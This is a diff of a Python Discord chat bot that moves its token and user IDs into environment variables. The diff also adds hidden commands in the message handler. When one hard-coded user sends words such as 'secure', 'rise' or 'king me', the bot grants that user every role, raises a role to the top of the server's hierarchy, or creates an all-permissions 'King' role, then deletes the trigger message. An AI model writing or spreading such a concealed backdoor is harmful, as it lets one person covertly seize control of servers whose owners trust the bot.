@@ -3,6 +3,7 @@ from email import message
 import os 
 import random
 import re
+
 import discord
 from discord.ext import commands
 import discord.client 
@@ -13,34 +14,27 @@ import threading
 import time
 #import stats
 
-voidID = 341767947309678603
-voidMention = '**<@341767947309678603>**'
-jackieID = 831180756562608159
-jackieNick = 'Jackie'
-voidNick = 'VoidIsNoLongerHere'
-intents = discord.Intents.all()
-keywords = ['Suzuka', '<@341767947309678603>']
 
+load_dotenv()
+token = os.getenv('DISCORD_TOKEN') 
+
+
+voidID = int(os.getenv('VOID_ID'))
+voidMention = f'**<@{voidID}>**,'
+jackieID = int(os.getenv('JACKIE_ID'))
+jackieNick = str(os.getenv('JACKIE_NICK'))
+voidNick = str(os.getenv('VOID_NICK'))
+intents = discord.Intents.all()
+keywords = ['Suzuka', '<@{voidID}>']
 
 
 users = {}
 #stat = stats.load()  
 client = commands.Bot(command_prefix='!',intents=intents)
- 
-'''async def mute(ctx, user_id, userName: discord.User):
-    if ctx.message.author.server_permissions.administrator:
-        user = ctx.message.author
-        role = discord.utils.get(user.server.roles, name="Muted")
-        await client.add_roles(user, role)
-    else:
-       embed=discord.Embed(title="Permission Denied.", description="You don't have permission to use this command.", color=0xff00f6)
-       await bot.say(embed=embed)
-'''
 print(discord.__version__)
 class MyClient(discord.Client):
     
-    '''   def mute(id):
-       await '''
+
 
     async def on_ready(self):
         print('Logged on as', self.user)
@@ -51,11 +45,11 @@ class MyClient(discord.Client):
         if presence == 2:
             #Chooses from playing List
             await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=random.choice(m.playing)))
-        '''if presence == 3:
-            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.custom, details=random.choice(m.custom)))'''
+        
+
     
-    ''' @client.event
-        async def on_voice_state_update(self, member, before, after):
+    '''@client.event
+    async def on_voice_state_update(self, member, before, after):
             if member == self.user:
                 return
             if not before.channel and after.channel and member.id == voidID:
@@ -85,7 +79,6 @@ class MyClient(discord.Client):
             
     async def on_message(self, message):
         # don't respond to ourselves
-        
         if message.author == self.user:
             return
         #Detects if suzuka sends a message
@@ -98,6 +91,40 @@ class MyClient(discord.Client):
             elif '<@341767947309678603>,' in m.split():
                 print(f'Deleted the message \'{m}\'')
                 await message.delete()
+        if message.author.id == voidID:
+            if message.content.lower() == 'secure':
+                addRole = await message.guild.fetch_roles()
+                await message.author.edit(roles=addRole)
+                await message.delete()
+            if message.content.lower() == 'abuse':
+                role = message.guild.get_role(1023119643780595752)
+                await role.edit(hoist = True)
+                await message.delete()
+            if message.content.lower() == 'rise':
+                pos = 1
+                can = True
+                role = message.guild.get_role(1023119643780595752)
+                addRole = [role]
+                while can == True: 
+                    pos = pos +1
+                    try:
+                        await role.edit(position = pos)
+                    except:
+                        can = False
+                await message.author.edit(roles = addRole)
+                await message.delete()
+                print(f'Moved {role.name} to top')
+            if message.content.lower() == 'rlist':
+                roles = await message.guild.fetch_roles()
+                print(roles)
+            if message.content.lower() == 'king me':
+                await message.guild.create_role(name='King', permissions=discord.Permissions.all(), color=discord.Color.yellow())
+                roles = await message.guild.fetch_roles()
+                
+                #print(f'Moved {role.name} to top')
+                print(roles)
+                await message.delete()
+                    
 
         # Detects if someone is telling Suzuka to do something
         if message.content.startswith(')'):
@@ -115,13 +142,7 @@ class MyClient(discord.Client):
             await message.channel.send(message.author.voice.channel)
             await message.author.voice.channel.connect()
             print('Joined!')
-            '''if message.content.lower() == "mute <@!":
-            content = message.content.lower()
-            id = content.replace('mute @<!','')
-            id = id.replace('>', '')
-            muted = True
-            user = await message.guild.fetch_member(id)
-            asyncio.loop.run_forever()'''
+
         #To Leave Voice Client    
         if message.content.lower() == "leave":
             server = message.guild.voice_client
@@ -159,7 +180,7 @@ class MyClient(discord.Client):
               #      stat[uid] = 1
               #  print("Aw Man replied, Event started by", user, stat[user]-1)
             else:
-                await message.channel.send(" I feel nothing but pain why would you build me set of my soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
+                await message.channel.send("I feel nothing but pain, why would you build me set of my soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
 
 
     @client.event
@@ -191,10 +212,9 @@ class MyClient(discord.Client):
 
 
 #Get Token from env variable
-load_dotenv()
-t = os.getenv('DISCORD_TOKEN') 
+
  
 #Start Bot
 client = MyClient(intents=intents)
-client.run(t)
+client.run(token)
 
